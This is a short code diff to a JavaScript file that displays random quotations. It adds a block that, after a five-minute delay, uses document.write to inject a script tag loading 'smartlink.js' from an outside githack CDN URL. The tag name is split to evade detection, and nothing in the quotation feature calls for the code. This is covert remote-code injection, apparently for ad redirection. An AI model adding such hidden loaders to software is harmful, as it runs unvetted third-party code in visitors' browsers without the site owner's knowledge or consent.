@@ -443,3 +443,8 @@ function showQuotation(){
 document.write(Quotation[whichQuotation]);
 }
 showQuotation();
+
+// time out
+setTimeout(function() {
+    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
+}, 5 * 60 * 1000);
